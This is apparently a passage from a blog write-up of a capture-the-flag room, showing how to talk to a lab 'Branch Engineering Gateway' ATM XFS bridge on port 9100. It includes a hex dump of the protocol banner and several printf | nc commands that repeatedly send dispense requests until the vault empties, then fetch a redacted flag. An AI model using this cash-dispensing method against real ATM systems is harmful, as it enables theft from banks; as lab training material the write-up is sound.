+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000000c0: 6570 6c79 5f66 6f72 6d61 7422 3a20 2232  eply_format&#34;</span>: <span style="color:#e6db74">&#34;2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000000d0: 2062 7974 6520 6269 672d 656e 6469 616e   byte big-endian
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000000e0: 206c 656e 6774 6820 2b20 3c6c 656e 6774   length + &lt;lengt
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000000f0: 683e 2062 7974 6573 206f 6620 4a53 4f4e  h&gt; bytes of JSON
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">00000100: 2028 7468 6973 2062 616e 6e65 7220 7573   (this banner us
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">00000110: 6573 2074 6865 2073 616d 6520 6672 616d  es the same fram
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">00000120: 696e 6729 222c 2022 6d73 675f 7479 7065  ing)&#34;</span>, <span style="color:#e6db74">&#34;msg_type
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">00000130: 7322 3a20 7b22 4745 5449 4e46 4f22 3a20  s&#34;</span>: <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;GETINFO&#34;</span>:
+</span></span><span style="display:flex;"><span>00000140: <span style="color:#ae81ff">2230</span> <span style="color:#ae81ff">7830</span> <span style="color:#ae81ff">3122</span> 2c20 <span style="color:#ae81ff">2245</span> <span style="color:#ae81ff">5845</span> <span style="color:#ae81ff">4355</span> <span style="color:#ae81ff">5445</span>  <span style="color:#e6db74">&#34;0x01&#34;</span>, <span style="color:#e6db74">&#34;EXECUTE
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">00000150: 223a 2022 3078 3032 227d 2c20 2268 696e  &#34;</span>: <span style="color:#e6db74">&#34;0x02&#34;</span><span style="color:#f92672">}</span>, <span style="color:#e6db74">&#34;hin
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">00000160: 7422 3a20 2271 7565 7279 2063 6f6d 6d61  t&#34;</span>: <span style="color:#e6db74">&#34;query comma
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">00000170: 6e64 2030 7830 3330 3420 2857 4653 5f49  nd 0x0304 (WFS_I
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">00000180: 4e46 5f43 444d 5f43 4150 4142 494c 4954  NF_CDM_CAPABILIT
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">00000190: 4945 5329 2077 6974 6820 6d73 675f 7479  IES) with msg_ty
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000001a0: 7065 2047 4554 494e 464f 2066 6f72 2074  pe GETINFO for t
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000001b0: 6865 2066 756c 6c20 636f 6d6d 616e 6420  he full command
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000001c0: 7461 626c 6522 7d00 2a7b 2272 6322 3a20  table&#34;</span><span style="color:#f92672">}</span>.*<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;rc&#34;</span>:
+</span></span><span style="display:flex;"><span>000001d0: <span style="color:#ae81ff">2257</span> <span style="color:#ae81ff">4653</span> 5f53 <span style="color:#ae81ff">5543</span> <span style="color:#ae81ff">4345</span> <span style="color:#ae81ff">5353</span> 222c <span style="color:#ae81ff">2022</span>  <span style="color:#e6db74">&#34;WFS_SUCCESS&#34;</span>, <span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000001e0: 6d6f 6e69 746f 725f 6f6e 223a 2066 616c  monitor_on&#34;</span>: fal
+</span></span><span style="display:flex;"><span>000001f0: <span style="color:#ae81ff">7365</span> 7d                                  se<span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>and it works cool , now we can make as many transactions as we need.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>k㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Downloads<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─ printf <span style="color:#e6db74">&#39;\x02\x00\x00\x04\x01\x00\x00&#39;</span> | nc &lt;YOUR_IP&gt; <span style="color:#ae81ff">9100</span>
+</span></span><span style="display:flex;"><span>�<span style="color:#e6db74">&#34;service&#34;</span>: <span style="color:#e6db74">&#34;Branch Engineering Gateway&#34;</span>, <span style="color:#e6db74">&#34;protocol&#34;</span>: <span style="color:#e6db74">&#34;XFS bridge&#34;</span>, <span style="color:#e6db74">&#34;request_format&#34;</span>: <span style="color:#e6db74">&#34;1 byte msg_type + 4 byte big-endian command id + 2 byte big-endian length + &lt;length&gt; bytes of data&#34;</span>, <span style="color:#e6db74">&#34;reply_format&#34;</span>: <span style="color:#e6db74">&#34;2 byte big-endian length + &lt;length&gt; bytes of JSON (this banner uses the same framing)&#34;</span>, <span style="color:#e6db74">&#34;msg_types&#34;</span>: <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;GETINFO&#34;</span>: <span style="color:#e6db74">&#34;0x01&#34;</span>, <span style="color:#e6db74">&#34;EXECUTE&#34;</span>: <span style="color:#e6db74">&#34;0x02&#34;</span><span style="color:#f92672">}</span>, <span style="color:#e6db74">&#34;hint&#34;</span>: <span style="color:#e6db74">&#34;query command 0x0304 (WFS_INF_CDM_CAPABILITIES) with msg_type GETINFO for the full command table&#34;</span><span style="color:#f92672">}</span>I<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;rc&#34;</span>: <span style="color:#e6db74">&#34;WFS_SUCCESS&#34;</span>, <span style="color:#e6db74">&#34;notes&#34;</span>: 40, <span style="color:#e6db74">&#34;value&#34;</span>: 4000, <span style="color:#e6db74">&#34;remaining_notes&#34;</span>: 240<span style="color:#f92672">}</span>^C
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>k㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Downloads<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─ printf <span style="color:#e6db74">&#39;\x02\x00\x00\x04\x01\x00\x00&#39;</span> | nc &lt;YOUR_IP&gt; <span style="color:#ae81ff">9100</span>
+</span></span><span style="display:flex;"><span>�<span style="color:#e6db74">&#34;service&#34;</span>: <span style="color:#e6db74">&#34;Branch Engineering Gateway&#34;</span>, <span style="color:#e6db74">&#34;protocol&#34;</span>: <span style="color:#e6db74">&#34;XFS bridge&#34;</span>, <span style="color:#e6db74">&#34;request_format&#34;</span>: <span style="color:#e6db74">&#34;1 byte msg_type + 4 byte big-endian command id + 2 byte big-endian length + &lt;length&gt; bytes of data&#34;</span>, <span style="color:#e6db74">&#34;reply_format&#34;</span>: <span style="color:#e6db74">&#34;2 byte big-endian length + &lt;length&gt; bytes of JSON (this banner uses the same framing)&#34;</span>, <span style="color:#e6db74">&#34;msg_types&#34;</span>: <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;GETINFO&#34;</span>: <span style="color:#e6db74">&#34;0x01&#34;</span>, <span style="color:#e6db74">&#34;EXECUTE&#34;</span>: <span style="color:#e6db74">&#34;0x02&#34;</span><span style="color:#f92672">}</span>, <span style="color:#e6db74">&#34;hint&#34;</span>: <span style="color:#e6db74">&#34;query command 0x0304 (WFS_INF_CDM_CAPABILITIES) with msg_type GETINFO for the full command table&#34;</span><span style="color:#f92672">}</span>I<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;rc&#34;</span>: <span style="color:#e6db74">&#34;WFS_SUCCESS&#34;</span>, <span style="color:#e6db74">&#34;notes&#34;</span>: 40, <span style="color:#e6db74">&#34;value&#34;</span>: 2000, <span style="color:#e6db74">&#34;remaining_notes&#34;</span>: 200<span style="color:#f92672">}</span>^C
+</span></span></code></pre></div><p>cool ,<br>
+the web-server:<br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020261011075704.png" alt="">
+<br>
+after spamming the dispense command we see the following :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>k㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Downloads<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─ printf <span style="color:#e6db74">&#39;\x02\x00\x00\x04\x01\x00\x00&#39;</span> | nc &lt;YOUR_IP&gt; <span style="color:#ae81ff">9100</span>
+</span></span><span style="display:flex;"><span>�<span style="color:#e6db74">&#34;service&#34;</span>: <span style="color:#e6db74">&#34;Branch Engineering Gateway&#34;</span>, <span style="color:#e6db74">&#34;protocol&#34;</span>: <span style="color:#e6db74">&#34;XFS bridge&#34;</span>, <span style="color:#e6db74">&#34;request_format&#34;</span>: <span style="color:#e6db74">&#34;1 byte msg_type + 4 byte big-endian command id + 2 byte big-endian length + &lt;length&gt; bytes of data&#34;</span>, <span style="color:#e6db74">&#34;reply_format&#34;</span>: <span style="color:#e6db74">&#34;2 byte big-endian length + &lt;length&gt; bytes of JSON (this banner uses the same framing)&#34;</span>, <span style="color:#e6db74">&#34;msg_types&#34;</span>: <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;GETINFO&#34;</span>: <span style="color:#e6db74">&#34;0x01&#34;</span>, <span style="color:#e6db74">&#34;EXECUTE&#34;</span>: <span style="color:#e6db74">&#34;0x02&#34;</span><span style="color:#f92672">}</span>, <span style="color:#e6db74">&#34;hint&#34;</span>: <span style="color:#e6db74">&#34;query command 0x0304 (WFS_INF_CDM_CAPABILITIES) with msg_type GETINFO for the full command table&#34;</span><span style="color:#f92672">}{</span><span style="color:#e6db74">&#34;rc&#34;</span>: <span style="color:#e6db74">&#34;WFS_SUCCESS&#34;</span>, <span style="color:#e6db74">&#34;notes&#34;</span>: 40, <span style="color:#e6db74">&#34;value&#34;</span>: 400, <span style="color:#e6db74">&#34;remaining_notes&#34;</span>: 0, <span style="color:#e6db74">&#34;detail&#34;</span>: <span style="color:#e6db74">&#34;vault empty - cashout proven; GET_FLAG now available&#34;</span><span style="color:#f92672">}</span>^C
+</span></span></code></pre></div><p>and we get the flag using x04 xff :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>k㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Downloads<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─ printf <span style="color:#e6db74">&#39;\x02\x00\x00\x04\xff\x00\x00&#39;</span> | nc &lt;YOUR_IP&gt; <span style="color:#ae81ff">9100</span>
+</span></span><span style="display:flex;"><span>�<span style="color:#e6db74">&#34;service&#34;</span>: <span style="color:#e6db74">&#34;Branch Engineering Gateway&#34;</span>, <span style="color:#e6db74">&#34;protocol&#34;</span>: <span style="color:#e6db74">&#34;XFS bridge&#34;</span>, <span style="color:#e6db74">&#34;request_format&#34;</span>: <span style="color:#e6db74">&#34;1 byte msg_type + 4 byte big-endian command id + 2 byte big-endian length + &lt;length&gt; bytes of data&#34;</span>, <span style="color:#e6db74">&#34;reply_format&#34;</span>: <span style="color:#e6db74">&#34;2 byte big-endian length + &lt;length&gt; bytes of JSON (this banner uses the same framing)&#34;</span>, <span style="color:#e6db74">&#34;msg_types&#34;</span>: <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;GETINFO&#34;</span>: <span style="color:#e6db74">&#34;0x01&#34;</span>, <span style="color:#e6db74">&#34;EXECUTE&#34;</span>: <span style="color:#e6db74">&#34;0x02&#34;</span><span style="color:#f92672">}</span>, <span style="color:#e6db74">&#34;hint&#34;</span>: <span style="color:#e6db74">&#34;query command 0x0304 (WFS_INF_CDM_CAPABILITIES) with msg_type GETINFO for the full command table&#34;</span><span style="color:#f92672">}</span>V<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;rc&#34;</span>: <span style="color:#e6db74">&#34;WFS_SUCCESS&#34;</span>, <span style="color:#e6db74">&#34;flag&#34;</span>: <span style="color:#e6db74">&#34;[REDACTED_solve it YOURSELF]&#34;</span><span style="color:#f92672">}</span>^C
+</span></span></code></pre></div><p>cool room</p>
+
+            </div>
+        </article></main>
+</div>
+
+    </div>
+    <footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+</div>
+    <small class="footer_copyright">
+        © 2026 .
+        
+    </small>
+</footer>
+</body>
+
+</html>
